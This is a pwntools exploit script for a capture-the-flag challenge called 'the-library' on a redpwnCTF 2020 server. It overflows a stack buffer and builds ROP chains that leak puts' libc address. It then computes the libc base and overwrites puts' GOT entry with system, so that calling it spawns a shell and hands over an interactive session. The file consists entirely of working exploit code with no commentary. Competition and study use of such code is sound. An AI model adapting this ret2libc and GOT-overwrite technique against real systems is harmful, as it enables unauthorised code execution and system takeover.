from pwn import *
context.arch = 'amd64'

#p = process( './the-library' )
p = remote( '2020.redpwnc.tf', 31350 )

p.recvuntil( '?\n' )

payload = b'a' * 0x18
pop_rdi = 0x0000000000400733
puts_got = 0x0000000000601018
puts_plt = 0x400520
read_plt = 0x400540

main = 0x00400637
rop1 = flat( [ pop_rdi, puts_got, puts_plt, main ] )
p.sendline( payload + rop1 )
p.recvuntil( '\n' )
p.recvuntil( '\n' )
puts_add = u64( p.recvuntil( '\n' )[:-1].ljust( 0x8, b'\x00' ) )
#print( hex(puts_add) )
system_off = 0x4f440
puts_off = 0x809c0

libc_base = puts_add - puts_off
system_add = system_off + libc_base

pop_rsi = 0x0000000000023e6a + libc_base
pop_rdx = 0x0000000000001b96 + libc_base
sh = 0x1393e + libc_base

rop2 = flat( [ pop_rdi, 0, pop_rsi, puts_got, pop_rdx, 0x8, read_plt, pop_rdi, sh, puts_plt ] )
#raw_input()
p.sendline( payload + rop2 )
raw_input()
p.sendline( p64( system_add ) )

p.interactive()


